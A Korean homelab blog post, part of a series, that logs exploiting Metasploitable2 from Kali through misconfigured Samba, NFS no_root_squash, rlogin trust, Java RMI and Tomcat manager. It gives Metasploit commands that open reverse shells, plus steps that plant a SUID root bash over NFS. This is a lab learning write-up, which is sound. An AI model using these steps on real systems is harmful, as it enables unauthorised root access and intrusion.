+++
title = "Kali × Metasploitable2 실습 (3)"
date = "2026-09-01T23:14:00.000+09:00"
draft = false
summary = "설정 오류를 찾아봅시다"
tags = [ "Proxmox", "Kali Linux", "Metasploitable2", "네트워크", "홈랩" ]
series = [ "Kali-Metasploit Lab" ]
+++

지난 편에서 Metasploitable2의 백도어 및 원격 코드 실행(RCE) 계열 취약점 네 개(vsftpd, UnrealIRCd, distccd, ingreslock)를 뚫었습니다. 이번 편에서는 예고했던 대로 코드 자체에 악성 코드가 심긴 게 아니라 정상 소프트웨어가 설정을 잘못해서 뚫리는 케이스를 다뤄볼 것입니다. 대상은 Samba, NFS, rlogin, Java RMI, Tomcat 다섯 개입니다.

## Samba usermap_script (CVE-2007-2447)

다섯 개나 되니까 뭐부터 손대야 할지 감이 안 잡혀서 대상 서비스 목록 중에 하나 골라서 AI한테 취약점부터 물어봤습니다.

Samba `smb.conf`에 `username map script`라는 옵션이 있는데 이게 켜져 있으면 SMB 로그인할 때 넘어온 사용자 이름 문자열을 검증 없이 그대로 셸 명령으로 실행해버린다고 합니다. Metasploitable2는 이 옵션이 켜진 채로 배포돼 있고요.

```shell
msf6 > search cve:2007-2447
```

`exploit/multi/samba/usermap_script` 모듈이 나왔습니다. RHOSTS 지정하고 바로 돌려봤습니다.

```shell
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.100.100
msf6 exploit(multi/samba/usermap_script) > run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444
[*] Exploit completed, but no session was created.
```

흠 세션이 안 열렸습니다. 경고 메시지를 보니 리버스 쉘인데 `LHOST`가 루프백으로 잡혀있었습니다. 이전에도 다뤄봤던 가벼운 오류였는데 신경을 못 썼네요.

```shell
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.100.10
msf6 exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 192.168.100.10:4444
[*] Command shell session 1 opened (192.168.100.10:4444 -> 192.168.100.100:42222)

whoami
root
```

root 쉘 확보했습니다. 사용자 이름 필드에 검증이 없어서 그 자리에 셸 명령을 끼워넣을 수 있었던 게 원인이었습니다.

## NFS no_root_squash

NFS를 잘 몰라서 먼저 뭔지부터 찾아봤습니다. 리눅스/유닉스에서 쓰는 원격 파일시스템 공유 프로토콜이고 `showmount -e`로 서버가 뭘 공유하고 있는지 볼 수 있다고 합니다.

```shell
$ showmount -e 192.168.100.100
Export list for 192.168.100.100:
/ *
```

`/`는 루트 파일시스템 전체 `*`는 아무나라는 뜻이었습니다. 즉 인증 없이 루트 파일시스템 전체를 마운트할 수 있다는 거였는데 여기서 뭘 할 수 있을지 생각해봤습니다. NFS는 uid를 그대로 믿는 방식이라서 보통은 원격에서 온 root 요청을 낮은 권한으로 깎아버리는 `root_squash`라는 안전장치가 기본으로 켜져 있다고 합니다. 근데 이 서버는 그게 꺼져 있는 `no_root_squash` 상태였습니다. 그러면 제가 root로 만든 파일이 대상 쪽에서도 root 소유로 남는다는 뜻이니 SUID 비트를 붙인 바이너리를 심어두면 됩니다.

```shell
$ sudo mkdir -p /mnt/nfs
$ sudo mount -t nfs 192.168.100.100:/ /mnt/nfs
$ sudo cp /bin/bash /mnt/nfs/tmp/rootbash
$ sudo chmod +s /mnt/nfs/tmp/rootbash
$ ls -la /mnt/nfs/tmp/rootbash
-rwsr-sr-x 1 root root 1298416 Sep  1 2026 /mnt/nfs/tmp/rootbash
```

`root root`로 확인됐습니다. 이제 대상에서 낮은 권한 계정으로 이 바이너리를 실행해서 진짜 root가 되는지 봐야 합니다.

```shell
msfadmin@metasploitable:~$ /tmp/rootbash -p
-bash: /tmp/rootbash: cannot execute binary file
```

갑자기 막혔습니다. 바이너리 파일을 실행할 수 없다는데 이유를 찾아보니 아키텍처 문제였습니다. Kali는 64비트인데 Metasploitable2는 32비트 우분투(8.04)라서 Kali의 `/bin/bash`를 그대로 복사하면 실행 자체가 안 되는 거였습니다. 대신 마운트해둔 경로 안에 있는 대상 자신의 `/bin/bash`를 복사하는 걸로 바꿨습니다.

```shell
$ sudo rm -f /mnt/nfs/tmp/rootbash
$ sudo cp /mnt/nfs/bin/bash /mnt/nfs/tmp/rootbash
$ sudo chmod +s /mnt/nfs/tmp/rootbash
```

```shell
msfadmin@metasploitable:~$ /tmp/rootbash -p
rootbash-3.2# whoami
root
```

이번엔 성공했습니다. `-p` 옵션도 필요했는데 bash는 setuid로 실행돼도 기본적으로 권한을 스스로 버리게 설계돼 있어서 `-p`를 줘야 그 동작을 끄고 SUID 권한을 유지한다고 합니다.

## rlogin 신뢰 관계

`rlogin`은 `.rhosts`나 `/etc/hosts.equiv`에 등록된 IP(와 계정)면 비밀번호 없이 믿어버린다고 들었던 게 기억나서 혹시나 하고 그냥 시도해봤습니다.

```shell
$ rlogin -l root 192.168.100.100
Last login: Mon Aug 17 02:51:16 EDT 2026 from :0.0 on pts/0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
...
root@metasploitable:~#
```

비밀번호 입력창도 없이 바로 root 쉘이 떴습니다. 신뢰 관계 설정이 거의 전체 허용으로 열려 있던 거였습니다.

## Java RMI

RMI도 처음 들어서 찾아봤습니다. 자바 프로그램이 네트워크 너머의 다른 자바 객체 메서드를 직접 호출할 수 있게 해주는 기능이고 1099번 포트의 레지스트리가 이 기능의 "전화번호부" 역할이라고 합니다.

```shell
msf6 > search rmi
```

검색해보니 `exploit/multi/misc/java_rmi_server`랑 `exploit/multi/browser/java_rmi_connection_impl` 두 개가 걸렸습니다. `info`로 비교해보니 `browser` 쪽은 피해자가 악성 페이지를 브라우저로 열게 만드는 방식이라 지금처럼 서버를 직접 공격하는 상황이랑은 안 맞았습니다. `misc` 쪽 모듈을 썼습니다.

```shell
msf6 > use exploit/multi/misc/java_rmi_server
msf6 exploit(multi/misc/java_rmi_server) > set RHOSTS 192.168.100.100
msf6 exploit(multi/misc/java_rmi_server) > set LHOST 192.168.100.10
msf6 exploit(multi/misc/java_rmi_server) > run
[*] Started reverse TCP handler on 192.168.100.10:4444
[*] Sending stage (58073 bytes) to 192.168.100.100
[*] Meterpreter session 1 opened (192.168.100.10:4444 -> 192.168.100.100:60388)
```

```shell
meterpreter > getuid
Server username: root
```

## Tomcat manager

Tomcat은 자바 웹 애플리케이션 서버인데 여기 딸린 manager 페이지로 관리자가 웹 UI에서 `.war` 파일을 배포할 수 있다고 합니다. 기본 계정이 그대로 남아있으면 아무나 로그인해서 배포할 수 있고 그 안에 JSP 웹쉘을 넣으면 접속하는 순간 서버에서 그 코드가 그대로 실행되는 구조입니다.

```shell
msf6 > search tomcat
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOST 192.168.100.100
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 192.168.100.10
msf6 exploit(multi/http/tomcat_mgr_upload) > run
[*] Started reverse TCP handler on 192.168.100.10:4444
[*] Retrieving session ID and CSRF token...
[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
```

실패했습니다. 계정 문제인가 싶어서 `HttpUsername`/`HttpPassword`를 `tomcat`/`tomcat`으로 넣어봤는데도 똑같은 에러가 났습니다. 다시 보니 `RPORT` 기본값이 `80`으로 되어 있었는데 Tomcat 포트는 `8180`이었습니다. 이걸 놓쳤네요.

```shell
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180
msf6 exploit(multi/http/tomcat_mgr_upload) > run
[*] Started reverse TCP handler on 192.168.100.10:4444
[*] Uploading and deploying ASHXo22GL2KWCunW51CYzSNDgr88...
[*] Executing ASHXo22GL2KWCunW51CYzSNDgr88...
[*] Undeploying ASHXo22GL2KWCunW51CYzSNDgr88...
[*] Sending stage (58073 bytes) to 192.168.100.100
[*] Meterpreter session 2 opened (192.168.100.10:4444 -> 192.168.100.100:41059)

meterpreter > getuid
Server username: tomcat55
```

이번엔 코드 실행까지는 성공했는데 권한이 root가 아니라 `tomcat55`였습니다. Tomcat 프로세스 자체가 낮은 권한 계정으로 돌고 있어서 그런 것 같습니다. 

## 정리

| 타깃 | 포트 | 결과 |
| --- | --- | --- |
| Samba usermap_script | 139 | root |
| NFS no_root_squash | 2049 | root |
| rlogin 신뢰 관계 | 512-514 | root |
| Java RMI | 1099 | root |
| Tomcat manager | 8180 | tomcat55 |

백도어(2주차)는 공격자가 코드에 의도적으로 심어둔 것이고 설정 오류(3주차)는 운영자가 기본값이나 과도한 신뢰를 그대로 둔 실수였습니다. 원인의 주체가 다릅니다.

다음 편은 웹 애플리케이션(DVWA, Mutillidae 등)을 다루어 볼 예정입니다. 이번에 root가 아니라 낮은 권한 계정만 나온 distccd(daemon), Tomcat(tomcat55)은 나중에 권한 상승 편에서 다시 쓸 예정입니다.
